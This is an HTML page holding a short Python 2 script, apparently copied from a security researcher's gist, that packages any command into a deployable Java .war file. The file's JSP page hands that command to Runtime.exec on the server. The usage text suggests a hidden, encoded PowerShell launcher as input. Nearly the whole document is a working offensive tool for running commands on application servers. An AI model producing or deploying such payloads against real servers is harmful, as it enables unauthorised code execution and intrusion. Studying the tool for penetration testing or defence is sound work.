<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Powershell to War</title>
</head><body>#!/usr/bin/python<br/>
# https://gist.github.com/HarmJ0y/aecabdc30f4c4ef1fad3<br/>
# Code that quickly generates a deployable .war for a PowerShell one-liner<br/>
<br/>
import zipfile<br/>
import StringIO<br/>
import sys<br/>
<br/>
def generatePsWar(psCmd, appName):<br/>
<br/>
&nbsp; &nbsp; # .war manifest<br/>
&nbsp; &nbsp; manifest = "Manifest-Version: 1.0\r\nCreated-By: 1.6.0_35 (Sun Microsystems Inc.)\r\n\r\n"<br/>
<br/>
&nbsp; &nbsp; # Create initial JSP and Web XML Strings with placeholders<br/>
&nbsp; &nbsp; jspCode = '''&lt;%@ page import="java.io.*" %&gt;<br/>
&lt;% <br/>
Process p=Runtime.getRuntime().exec("'''+str(psCmd)+'''");<br/>
%&gt;<br/>
'''<br/>
<br/>
&nbsp; &nbsp; # .xml deployment config<br/>
&nbsp; &nbsp; wxmlCode = '''&lt;?xml version="1.0"?&gt;<br/>
&lt;!DOCTYPE web-app PUBLIC <br/>
"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" <br/>
"http://java.sun.com/dtd/web-app_2_3.dtd"&gt;<br/>
&lt;web-app&gt;<br/>
&lt;servlet&gt;<br/>
&lt;servlet-name&gt;%s&lt;/servlet-name&gt;<br/>
&lt;jsp-file&gt;/%s.jsp&lt;/jsp-file&gt;<br/>
&lt;/servlet&gt;<br/>
&lt;/web-app&gt;<br/>
''' %(appName, appName)<br/>
<br/>
&nbsp; &nbsp; # build the in-memory ZIP and write the three files in<br/>
&nbsp; &nbsp; warFile = StringIO.StringIO() <br/>
&nbsp; &nbsp; zipData = zipfile.ZipFile(warFile, 'w', zipfile.ZIP_DEFLATED)<br/>
<br/>
&nbsp; &nbsp; zipData.writestr("META-INF/MANIFEST.MF", manifest)<br/>
&nbsp; &nbsp; zipData.writestr("WEB-INF/web.xml", wxmlCode)<br/>
&nbsp; &nbsp; zipData.writestr(appName + ".jsp", jspCode)<br/>
&nbsp; &nbsp; zipData.close()<br/>
<br/>
&nbsp; &nbsp; return warFile.getvalue()<br/>
<br/>
<br/>
if len(sys.argv) != 2:<br/>
&#09;print "\nUsage: ./pswar.py 'powershell -w hidden -nop -enc BLAH'\n"<br/>
<br/>
<br/>
else:<br/>
<br/>
&#09;war = generatePsWar(sys.argv[1], 'launcher')<br/>
<br/>
&#09;f = open("launcher.war", 'wb')<br/>
&#09;f.write(war)<br/>
&#09;f.close()<br/>
<br/>
&#09;print "\nLauncher WAR written to launcher.war\n"</body></html>